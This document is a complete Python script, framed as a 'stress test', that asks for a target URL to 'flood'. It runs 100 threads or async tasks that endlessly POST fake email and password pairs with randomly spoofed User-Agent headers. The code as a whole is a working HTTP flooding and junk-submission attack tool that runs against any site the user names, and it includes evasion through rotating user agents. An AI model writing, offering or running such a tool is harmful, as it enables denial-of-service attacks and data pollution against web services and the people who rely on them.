import threading
import requests
import random
import string
import names
import asyncio
import aiohttp
from fake_useragent import UserAgent
import time

def name_gen():
    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    if name_system == "FullName":
        return first_name + last_name
    elif name_system == "FullFirstFirstInitial":
        return first_name + last_name[0]
    return first_name[0] + last_name

def generate_random_email():
    name = name_gen()
    NumberOrNo = random.choice(["Number", "No"])
    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + domain
    else:
        return name + domain

def generate_random_password():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))

async def send_posts_async(url):
    while True:
        try:
            email = generate_random_email()
            password = generate_random_password()
            data = {"a": email, "az": password}
            ua = UserAgent()
            user_agent = ua.random
            headers = {'User-Agent': user_agent}
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data=data, headers=headers) as response:
                    print(f"Email: {email}, Password: {password}, Status Code: {response.status}, headers: {user_agent}")
        except Exception as e:
            print(f"An error occurred: {e}")

async def main_async():
    url = input("Enter the URL of the target you want to flood: ")
    tasks = [send_posts_async(url) for _ in range(100)]
    await asyncio.gather(*tasks)

def send_posts(url):
    while True:
        try:
            email = generate_random_email()
            password = generate_random_password()
            data = {"a": email, "az": password}
            ua = UserAgent()
            user_agent = ua.random
            headers = {'User-Agent': user_agent}
            response = requests.post(url, data=data, headers=headers)
            print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
        except Exception as e:
            print(f"An error occurred: {e}")

def start_threading(url):
    threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(100)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

def stress_test():
    method = input("Choose the method for stress testing (threading/asyncio): ").strip().lower()
    url = input("Enter the URL of the target you want to flood: ")

    if method == "asyncio":
        asyncio.run(main_async())
    elif method == "threading":
        start_threading(url)
    else:
        print("Invalid method. Choose either 'threading' or 'asyncio'.")

if __name__ == "__main__":
    stress_test()
